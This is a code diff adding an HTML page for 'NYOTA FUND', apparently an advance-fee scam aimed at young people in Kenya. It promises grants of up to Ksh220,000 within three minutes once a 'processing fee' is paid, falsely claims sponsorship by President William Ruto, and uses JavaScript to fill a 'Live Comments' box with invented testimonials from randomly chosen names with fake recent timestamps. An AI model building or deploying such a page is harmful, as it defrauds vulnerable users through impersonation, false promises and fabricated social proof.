@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+ <!-- Brevo Conversations {literal} -->
+<script>
+    (function(d, w, c) {
+        w.BrevoConversationsID = '6973a340153840fff105d60b';
+        w[c] = w[c] || function() {
+            (w[c].q = w[c].q || []).push(arguments);
+        };
+        var s = d.createElement('script');
+        s.async = true;
+        s.src = 'https://conversations-widget.brevo.com/brevo-conversations.js';
+        if (d.head) d.head.appendChild(s);
+    })(document, window, 'BrevoConversations');
+</script>
+<!-- /Brevo Conversations {/literal} -->
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>NYOTA FUND – Amount Selection</title>
+
+  <link rel="stylesheet" href="style.css">
+
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+  <script src="firebase-config.js"></script>
+</head>
+<body>
+
+<div class="container">
+
+  <p style="font-size:20px; font-weight:bold;">
+    Congratulations 👏 <span id="username"></span>.
+  </p>
+
+  <p>
+    You are eligible to receive NYOTA FUND. Here is your NYOTA FUNDs LIMIT.
+    ⬇️⬇️⬇️
+  </p>
+
+  <ul style="font-size:18px; line-height:1.8;">
+    <li>1. Ksh22,000 — processing fee is <strong>Ksh240</strong></li>
+    <li>2. Ksh32,300 — processing fee is <strong>Ksh290</strong></li>
+    <li>3. Ksh43,800 — processing fee is <strong>Ksh330</strong></li>
+    <li>4. Ksh50,000 — processing fee is <strong>Ksh410</strong></li>
+    <li>5. Ksh93,300 — processing fee is <strong>Ksh490</strong></li>
+    <li>6. Ksh102,000 — processing fee is <strong>Ksh545</strong></li>
+    <li>7. Ksh150,000 — processing fee is <strong>Ksh600</strong></li>
+    <li>8. Ksh200,000 — processing fee is <strong>Ksh685</strong></li>
+    <li>9. Ksh220,000 — processing fee is <strong>Ksh710</strong></li>
+  </ul>
+
+  <p style="margin-top:10px;">
+    That's our 2025–2026 strategy of supporting our Youths.
+    You are required to choose the amount you can afford to pay its processing fee.
+  </p>
+
+  <p style="font-weight:bold;">
+    REMEMBER YOU WILL RECEIVE YOUR NYOTA FUND IN LESS THAN 3 MINUTES AFTER PAYING IT'S PROCESSING FEE.
+  </p>
+
+  <p>
+    NYOTA FUND KENYA sponsored by
+    <strong>WILLIAM SAMOEI RUTO</strong>, President of Kenya 🇰🇪
+  </p>
+
+  <hr>
+
+  <!-- Amount buttons -->
+  <div class="fund-buttons">
+  <button data-amount="22000" data-fee="240">Ksh 22,000</button>
+  <button data-amount="32300" data-fee="290">Ksh 32,300</button>
+  <button data-amount="43800" data-fee="330">Ksh 43,800</button>
+  <button data-amount="50000" data-fee="410">Ksh 50,000</button>
+  <button data-amount="93300" data-fee="490">Ksh 93,300</button>
+  <button data-amount="102000" data-fee="545">Ksh 102,000</button>
+  <button data-amount="150000" data-fee="600">Ksh 150,000</button>
+  <button data-amount="200000" data-fee="685">Ksh 200,000</button>
+  <button data-amount="220000" data-fee="710">Ksh 220,000</button>
+</div>
+
+  <p style="font-size:20px; margin-top:15px;">
+  Amount to Receive:
+  <strong>Ksh <span id="selectedAmount">---</span></strong>
+</p>
+
+<p style="font-size:20px;">
+  It's Processing Fee:
+  <strong>Ksh <span id="processingFee">---</span></strong>
+</p>
+
+  <button onclick="continueToPayment()">Continue to Payment</button>
+
+  <!-- Comments -->
+  <h3 style="margin-top:30px;">Live Comments now</h3>
+  <div id="commentsBox" class="comments-box"></div>
+
+</div>
+
+<script>
+ /* ===== LOAD USER NAME FROM REGISTER (CAPITAL) ===== */
+(function () {
+  const phone = localStorage.getItem("userPhone");
+  const users = JSON.parse(localStorage.getItem("nyota_users") || "[]");
+
+  if (!phone || !users.length) {
+    console.warn("User not found in localStorage");
+    return;
+  }
+
+  const currentUser = users.find(u => u.phone === phone);
+
+  if (currentUser && currentUser.fullname) {
+    const nameEl = document.getElementById("username");
+    if (nameEl) {
+      nameEl.textContent = currentUser.fullname.toUpperCase();
+    }
+  }
+})();
+/* ================= USER DATA ================= */
+// const userPhone = localStorage.getItem("userPhone");
+// if (!userPhone) {
+//   window.location.href = "register.html";
+// }
+
+let selectedFund = null;
+ const savedFundRaw = localStorage.getItem("selectedFund");
+const savedFund = savedFundRaw ? JSON.parse(savedFundRaw) : null;
+
+if (savedFund) {
+  selectedFund = savedFund;
+  document.getElementById("selectedAmount").innerText = savedFund.amount;
+  document.getElementById("processingFee").innerText = savedFund.fee;
+}
+/*
+db.collection("users").doc(userPhone).get().then(doc => {
+  if (doc.exists && doc.data().fullname) {
+    document.getElementById("username").innerText = doc.data().fullname;
+  }
+});
+*/
+/* ================= AMOUNT SELECTION ================= */
+
+document.querySelectorAll(".fund-buttons button").forEach(btn => {
+  btn.addEventListener("click", () => {
+
+    selectedFund = {
+      amount: btn.dataset.amount,
+      fee: btn.dataset.fee
+    };
+
+    // Show selected values
+    document.getElementById("selectedAmount").innerText = selectedFund.amount;
+    document.getElementById("processingFee").innerText = selectedFund.fee;
+
+    // Save to localStorage
+    localStorage.setItem("selectedFund", JSON.stringify(selectedFund));
+  });
+});
+
+function continueToPayment() {
+  if (!selectedFund) {
+    alert("Please select amount first.");
+    return;
+  }
+
+  // Save to localStorage
+  localStorage.setItem("selectedFund", JSON.stringify(selectedFund));
+
+  // Go to payment page
+  window.location.href = "payment1.html";
+}
+
+/* ================= COMMENTS & TESTIMONIES ================= */
+const commentsBox = document.getElementById("commentsBox");
+
+const names = [
+  "Mary Wanjiku","James Otieno","Faith Njeri","Kevin Mwangi",
+  "Brian Kiptoo","Ann Chebet","John Kamau","Lucy Atieno",
+  "Peter Mutiso","Grace Akinyi","Samuel Kibet","Mercy Nyambura",
+  "Daniel Ouma","Esther Jepchirchir","Joseph Maina","Susan Wairimu",
+  "Victor Ochieng","Alice Muthoni","Dennis Barasa","Ruth Chelimo",
+  "Paul Onyango","Nancy Wambui","Eric Rotich","Linda Auma",
+  "George Kiplagat","Janet Moraa","Michael Njoroge","Brenda Akinyi",
+  "Stephen Bett","Caroline Mumbi","Allan Otieno","Diana Jepkosgei",
+  "Patrick Kimani","Beatrice Wanjala","Noah Kiplangat","Irene Atieno",
+  "Felix Kariuki","Joyce Nyambura","Caleb Mutua","Winfred Chepkemoi"
+];
+
+const messages = [
+  "Just received 50k from NYOTA FUND! Thank you 🙏",
+"Thought it was a scam but got my 25k. So happy!",
+"Received 40k. Real and trusted platform 🙌",
+"Funds came in less than 3 minutes. Amazing!",
+"I top up my business with NYOTA FUND. Thanks!",
+"Very quick and reliable. Got 30k.",
+"I started my small business using 50k. Thank you!",
+"Payment was smooth, received 26,500.",
+"NYOTA FUND is trustworthy. Got my 38k.",
+"Amazing service, 46,850 received.",
+"Quick approval and fast fund delivery.",
+"Thought it was fake but got my money.",
+"12,300 received successfully. Thank you NYOTA FUND!",
+"Funds delivered faster than expected.",
+"Real platform, got 50k in my phone.",
+"My business top-up went through smoothly.",
+"NYOTA FUND is the real deal. 79,700 received.",
+"Funds helped pay my rent. Thank you!",
+"Quick processing, I received 106,500.",
+"Very satisfied with NYOTA FUND.",
+"Received my 38,100 in minutes.",
+"Started business and got 26,500.",
+"Funds legit, fast, and reliable.",
+"Happy to receive 46,850, thanks!",
+"NYOTA FUND never disappoints.",
+"50k received in record time.",
+"Platform is trustworthy. Funds received.",
+"I paid the processing fee and got my 12,300 instantly.",
+"Real platform, very satisfied.",
+"Received 79,700, helped me start my project."
+];
+
+function timeAgo() {
+  const times = [
+    "just now","2 seconds ago","10 seconds ago",
+    "30 seconds ago","1 minute ago","2 minutes ago","5 minutes ago"
+  ];
+  return times[Math.floor(Math.random() * times.length)];
+}
+
+// Shuffle
+function shuffle(arr) {
+  for (let i = arr.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [arr[i], arr[j]] = [arr[j], arr[i]];
+  }
+  return arr;
+}
+
+let comments = shuffle(names).map(name => ({
+  name,
+  text: messages[Math.floor(Math.random() * messages.length)],
+  time: timeAgo()
+}));
+
+comments.forEach(c => {
+  const div = document.createElement("div");
+  div.className = "comment";
+  div.innerHTML = `
+    <strong>${c.name}</strong>: ${c.text}
+    <br><span>commented ${c.time}</span>
+  `;
+  commentsBox.appendChild(div);
+});
+
+// Auto scroll
+let scrollPos = 0;
+setInterval(() => {
+  scrollPos++;
+  commentsBox.scrollTop = scrollPos;
+  if (scrollPos >= commentsBox.scrollHeight - commentsBox.clientHeight) {
+    scrollPos = 0;
+  }
+}, 60);
+</script>
+
+</body>
+</html>
